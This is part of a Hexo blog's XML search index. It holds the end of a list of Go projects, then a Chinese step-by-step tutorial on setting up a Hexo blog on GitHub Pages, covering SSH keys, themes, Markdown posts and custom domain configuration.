Awesome-go介绍：这不是一个go项目，他是一个学习go的资料网站，属于著名的awesome系列，里面关于go的资源非常详细。 star数：40465地址：https://github.com/avelino/awesome-go Open-falcon介绍：越来越fashion的监控系统，小米开源。 star数：4267地址：https://github.com/open-falcon/falcon-plus Tidb介绍：TiDB 是一个分布式 NewSQL 数据库。它支持水平弹性扩展、ACID 事务、标准 SQL、MySQL 语法和 MySQL 协议，具有数据强一致的高可用特性，是一个不仅适合 OLTP 场景还适合 OLAP 场景的混合数据库。 star数：17508地址：https://github.com/pingcap/tidb]]></content>
      <categories>
        <category>运维研发</category>
        <category>语言积累</category>
      </categories>
      <tags>
        <tag>Go</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[超详细的hexo+github page搭建.md]]></title>
    <url>%2Farticles%2Fd2a49991.html</url>
    <content type="text"><![CDATA[安装node.js在 Windows 环境下安装 Node.js 非常简单，仅须到官网下载安装文件并执行即可完成安装，其中LTS是长期支持版，Current为最新版，但最新版一般都在开发阶段，还不稳定。建议选择LTS版本 像我的是Windows 64位LTS，直接下载后执行，无脑下一步就行了，不需要配置环境变量。 安装git访问Git官网，下载对应系统的版本。 这里选择windows, 下载完成后执行，一直下一步安装完毕。验证：通过在命令行输入 git version 查看是否安装成功，有输出版本号说明安装成功。 因是windows图形界面，鼠标右键桌面菜单中就多了Git GUI Here和Git Bash Here两个按钮，一个是图形界面的Git操作，一个是命令行，我们选择Git Bash Here。 Hexo介绍Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。 安装Hexo桌面右键鼠标，点击Git Bash Here，输入npm命令即可安装 12npm install hexo-cli -gnpm install hexo-deployer-git --save 第一句是安装hexo，第二句是安装hexo部署到gitpage的deployer依赖包，两个都需要安装。 创建Hexo文件夹安装完成后，根据自己喜好建立目录（如F:\Blog\Hexo），直接进入F:\Blog\Hexo文件夹下右键鼠标，点击Git Bash Here，进入Git命令框，执行以下操作。 1$ hexo init 安装 Hexo 完成后，Hexo 将会在指定文件夹中新建所需要的文件。Hexo文件夹下的目录如下： 本地查看效果执行下面语句，执行完即可登录localhost:4000查看效果 12hexo generatehexo server 登录localhost:4000，即可看到本地的效果如下： 部署到GitHub Page上那么现在本地的博客已经搭建起来了，但是我们只可以通过本地连接查看我们的博客。那么我们现在需要做的就是把本地的博客发布到服务器上，让别人也可以连接我们的博客，而Github Pages就帮我完成了这件事情。但是Github Pages的代码就是寄存在Github上面的。那么接下来我们需要在Github上面创建一个新的项目。 一、注册github账户访问Github首页点击右上角的 Sign Up，注册自己的账户 二、创建代码库注册完登陆后，我们就创建一个我们自己的Github Pages项目。点击New repository，按图中所示填写。 三、配置SSH密钥配置Github的SSH密钥可以让本地git项目与远程的github建立联系，让我们在本地写了代码之后直接通过git操作就可以实现本地代码库与Github代码库同步。操作如下： 第一步、看看是否存在SSH密钥(keys)首先，我们需要看看是否看看本机是否存在SSH keys,打开Git Bash,并运行: $ cd ~/. ssh检查你本机用户home目录下是否存在.ssh目录 如果，不存在此目录，则进行第二步操作，否则，你本机已经存在ssh公钥和私钥，可以略过第二步，直接进入第三步操作。 第二步、创建一对新的SSH密钥(keys)1234$ssh-keygen -t rsa -C &quot;your_email@example.com&quot;#这将按照你提供的邮箱地址，创建一对密钥Generating public/private rsa key pair.Enter file in which to save the key (/c/Users/you/.ssh/id_rsa): [Press enter] 直接回车，则将密钥按默认文件进行存储。此时也可以输入特定的文件名，比如/c/Users/you/.ssh/github_rsa 接着，根据提示，你需要输入密码和确认密码（说到这里，如果你很放心，其实可以不用密码，就是到输密码的地方，都直接回车，所以每次push就只管回车就行了。所谓的最安全的密码，就是没有密码 哈哈）。相关提示如下： 12Enter passphrase (empty for no passphrase): [Type a passphrase]Enter same passphrase again: [Type passphrase again] 输入完成之后，屏幕会显示如下信息： 1234Your identification has been saved in /c/Users/you/.ssh/id_rsa.Your public key has been saved in /c/Users/you/.ssh/id_rsa.pub.The key fingerprint is:01:0f:f4:3b:ca:85:d6:17:a1:7d:f0:68:9d:f0:a2:db your_email@example.com 第三步、在GitHub账户中添加你的公钥运行如下命令，将公钥的内容复制到系统粘贴板(clipboard)中，或者打开~/.ssh/id_rsa.pub后复制。 1clip &lt; ~/.ssh/id_rsa.pub 接着： 登陆GitHub,进入你的Account Settings. 2.选择SSH Keys 3.粘贴密钥，添加即可 第四步、测试可以输入下面的命令，看看设置是否成功，git@github.com的部分不要修改： 1$ ssh -T git@github.com 如果是下面的反馈： 123The authenticity of host &apos;github.com (207.97.227.239)&apos; can&apos;t be established.RSA key fingerprint is 16:27:ac:a5:76:28:2d:36:63:1b:56:4d:eb:df:a6:48.Are you sure you want to continue connecting (yes/no)? 不要紧张，输入yes就好。 第五步、设置用户信息现在你已经可以通过SSH链接到GitHub了，还有一些个人信息需要完善的。 Git会根据用户的名字和邮箱来记录提交。GitHub也是用这些信息来做权限的处理，输入下面的代码进行个人信息的设置，把名称和邮箱替换成你自己的，名字根据自己的喜好自己取，而不是GitHub的昵称。 12$ git config --global user.name &quot;wandouduoduo&quot;//用户名$ git config --global user.email &quot;wandouduoduo@163.com&quot;//填写自己的邮箱 第六步、SSH Key配置成功本机已成功连接到github。 四、将本地的Hexo文件更新到Github的库中第一步、登录Github打开自己的项目 username.github.io 第二步、打开之后，点击SSH，选择SSH类型地址 第三步、复制地址 第四步、打开你一开始创建的Hexo文件夹（如E:\Blog\Hexo），用记事本打开刚文件夹下的_config.yml文件 第五步、在配置文件里作如下修改，保存 第六步、在Hexo文件夹下执行： 12hexo ghexo d 或者直接执行 1hexo g -d 执行完之后会让你输入github的账号和密码，输入完后就可以登录我们自己的部署在Github Pages服务器上的博客了。对应的地址是 username.github.io(我的是：wandouduoduo.github.io)。 假如这时候，报错 ERROR Deployer not found: git，那么就是你的deployer没有安装成功，你需要执行如下命令再安装一次： 1npm install hexo-deployer-git --save 这样，你再执行hexo g -d，你的博客就部署到Github上了。 第七步、在浏览器上输入自己的主页地址在浏览器上输入Github Pager为我们生成的外链（例如我的是：https://wandouduoduo.github.io，而你的只需要把你的github用户名替换掉这个链接中的wandouduoduo，因为我的用户名是这个）即可看到自己的博客了。 当然，每一个人都可以通过这个地址访问到你的博客了。 美化自己博客那么现在我们的博客已经挂在了Github服务器上面，别人已经可以通过地址来登陆我们的博客了，但是我们这时就有了新的需求，就是自己的博客并不好看，那怎么办的？这很简单，要知道很多前端开发者在Hexo框架下开发了很多的主题给我们使用，我们只需要把他们的主题克隆过来，然后通过修改配置文件即可达到我们所需要的效果。 那么我们应该怎么修改呢？ 一、进入Hexo的官网主题专栏 二、挑选我们喜欢的主题可以看到有很多主题给我们选，我们只要选择喜欢的主题点击进去，然后进入到它的github地址，我们只要把这个地址复制下来(例如我是选择：hexo-theme-next这个主题) 三、克隆主题再打开Hexo文件夹下的themes目录（E:\Blog\hexo\themes），右键Git Bash，在命令行输入命令下载: 1git clone https://github.com/iissnan/hexo-theme-next(此处地址替换成你需要使用的主题的地址) 四、修改Hexo配置文件下载完成后，打开Hexo文件夹下的配置文件_config.yml 修改参数为： 1theme: hexo-theme-next 五、部署主题，本地查看效果返回Hexo目录，右键Git Bash，输入 12hexo ghexo s 打开浏览器，输入 http://localhost:4000/ 即可看见我们的主题已经更换了。 六、如果效果满意，将它部署到Github上打开Hexo文件夹，右键Git Bash，输入 hexo clean (必须要，不然有时因为缓存问题，服务器更新不了主题)hexo g -d 七、打开自己的主页，即可看到修改后的效果更多修改效果请查看对应主题的说明文档，点击此查看本主题(Next)对应的说明文档。 在博客写文章一、用hexo发表新文章` 1$ hexo n &quot;文章标题&quot; 其中 我的家 为文章标题，执行命令 hexo n “我的家” 后，会在项目 \Hexo\source_posts 中生成 我的家.md文件，用编辑器打开编写即可。 当然，也可以直接在\Hexo\source_posts中新建一个md文件，我就是这么做的。 写完后，推送到服务器上，执行以下命令即可在我们的站点看到新的文章。 12$ hexo g #生成$ hexo d #部署 # 可与hexo g合并为 hexo d -g 二、用Markdown写文章我们注意到在 \Hexo\source_posts 文件夹下存放着我们的文章，它们的格式都是以.md格式结尾的，没错，Hexo也是支持Markdown语法的，所以当我们需要写具有格式化的文章时，我们可以使用支持Markdown语法的编辑器进行文章编译，然后保存文件到 \Hexo\source_posts 文件夹下即可。 复制进去之后，只要执行 1$ hexo d -g 推送到我们的Github仓库即可。 那么什么是Markdown？Markdown 是一种轻量级的「标记语言」，它的优点很多，目前也被越来越多的写作爱好者，撰稿者广泛使用。看到这里请不要被「标记」、「语言」所迷惑，Markdown 的语法十分简单。常用的标记符号也不超过十个，这种相对于更为复杂的HTML 标记语言来说，Markdown 可谓是十分轻量的，学习成本也不需要太多，且一旦熟悉这种语法规则，会有一劳永逸的效果。 Markdown有什么优点？专注你的文字内容而不是排版样式。轻松的导出 HTML、PDF 和本身的 .md 文件。纯文本内容，兼容所有的文本编辑器与字处理软件。可读，直观。适合所有人的写作语言。我该用什么工具？Windows下可以使用 MarkdownPad2。在 Mac OS X 上，我建议你用 Mou 这款免费且十分好用的 Markdown 编辑器。Web 端上，我强烈推荐 简书 这款产品。关于Markdown的更多资料可以查看如下： 认识与入门 MarkdownMarkdown入门指南 将自己的域名关联到Github Pages上很多朋友创建了自己的博客之后会选择买一个属于自己的域名，然后将自己域名绑定到自己的Github Pages博客上，其实这也并不难，只要你有个域名。 一、购买域名如果你不是很有钱，在阿里云上，你只要几块钱就可以买到一个域名。 选择你喜欢的域名，然后购买即可。 二、配置CNAME文件在 \hexo\source 文件夹下创建文件 CNAME （新建记事本文件命名CNAME，然后打开） 内容为你的域名 在Hexo文件夹提交 1hexo g -d 三、修改DNS的DNS1.如果你是在阿里云购买域名的话，请登录阿里云网站。打开个人中心，点击域名 2.选择管理 3.修改DNS为 12f1g1ns2.dnspod.net f1g1ns1.dnspod.net 四、域名解析打开DNSPOD，注册一个账户 点击添加域名，把你的域名添加进去，如无意外，添加完之后就是以下这个状态 此时点击添加记录，添加两个记录，一个主机记录为@， 一个为www，而记录值都是填同一个，填你的博客主页对应的ip，添加完后如下。 但是如何获取ip值呢？打开运行，输入cmd，打开命令窗口输入 ping 域名 ， 查看解析ip地址 将IP输入过去，然后会提示你到域名注册的地方修改DNS。等待生效，最迟72小时生效。即可通过你的域名浏览你的博客主页。 结语按照上述操作，开始建立你自己的博客吧，还在等什么呢？用博客展现自己的能力和分享自己心得，你会交到很多志同道合的朋友和成就。]]></content>
      <categories>
        <category>应用运维</category>
        <category>服务搭建</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>Hexo</tag>
      </tags>
  </entry>
</search>
